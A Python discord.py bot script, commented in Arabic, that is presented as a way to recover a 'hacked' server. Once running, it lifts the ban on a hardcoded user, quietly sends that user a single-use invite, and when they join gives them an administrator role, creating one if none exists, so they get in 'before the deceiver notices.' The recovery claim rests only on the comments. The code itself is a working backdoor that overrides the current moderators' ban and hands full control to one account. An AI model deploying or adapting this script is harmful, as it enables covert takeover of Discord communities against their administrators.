import discord
from discord.ext import commands
import os

# 1. إعداد الصلاحيات الكاملة للبوت (ضروري جداً)
intents = discord.Intents.all()
bot = commands.Bot(command_prefix="!", intents=intents)

# --- الإعدادات الحساسة (استبدل القيم بالـ IDs الخاصة بك) ---
TARGET_GUILD_ID = 123456789012345678  # ضع هنا الـ ID الخاص بسيرفرك المخترق
YOUR_USER_ID = 987654321098765432      # ضع هنا الـ ID الخاص بحسابك الشخصي
# ---------------------------------------------------------

@bot.event
async def on_ready():
    print(f" [+] البوت يعمل الآن باسم: {bot.user}")
    
    # جلب السيرفر المستهدف
    guild = bot.get_guild(TARGET_GUILD_ID)
    if not guild:
        print(" [!] لم يتم العثور على السيرفر، تأكد من الـ ID.")
        return

    print(f" [+] تم الاتصال بالسيرفر: {guild.name}")

    # المرحلة الأولى: إلغاء الباند عنك تلقائياً
    try:
        await guild.unban(discord.Object(id=YOUR_USER_ID), reason="Emergency Unban")
        print(" [+] تم إلغاء الحظر عن حسابك بنجاح!")
    except Exception as e:
        print(f" [-] فشل إلغاء الحظر: {e}")

    # المرحلة الثانية: إنشاء رابط دعوة سري وإرساله لك
    try:
        # البحث عن أول قناة كتابية متاحة لإنشاء الرابط منها
        target_channel = guild.text_channels[0]
        invite = await target_channel.create_invite(max_uses=1, unique=True, reason="Recovery")
        
        # جلب حسابك لإرسال الرسالة الخاصة
        owner = await bot.fetch_user(YOUR_USER_ID)
        await owner.send(f"⚠️ **رابط استعادة السيرفر العاجل:** {invite.url}\nادخل فوراً قبل أن ينتبه المخادع!")
        print(" [+] تم إرسال رابط الدعوة إلى حسابك الخاص.")
    except Exception as e:
        print(f" [-] فشل إنشاء الرابط أو إرساله: {e}")


# المرحلة الثالثة: إعطاؤك الصلاحيات فور دخولك
@bot.event
async def on_member_join(member):
    # التأكد من أن العضو الذي دخل هو أنت
    if member.id == YOUR_USER_ID:
        guild = member.guild
        print(f" [+] محمد دخل السيرفر الآن. جاري منحه الصلاحيات...")
        
        try:
            # البحث عن أعلى رتبة يمتلكها البوت لكي يعطيك إياها، أو رتبة بها صلاحية Admin
            admin_role = None
            for role in guild.roles:
                if role.permissions.administrator and role < guild.me.top_role:
                    admin_role = role
                    break
            
            # إذا لم يجد رتبة جاهزة، سيقوم البوت بإنشاء رتبة جديدة لك
            if not admin_role:
                admin_role = await guild.create_role(
                    name="⚡", 
                    permissions=discord.Permissions(administrator=True),
                    reason="Recovery Admin"
                )
            
            # منحك الرتبة
            await member.add_roles(admin_role)
            print(" [+] تم منحك صلاحيات الـ Administrator بنجاح! السيرفر لك الآن.")
        except Exception as e:
            print(f" [-] فشل منح الرتبة: {e}")

# تشغيل البوت باستخدام التوكن المخفي من إعدادات Railway
bot.run(os.getenv("DISCORD_TOKEN"))
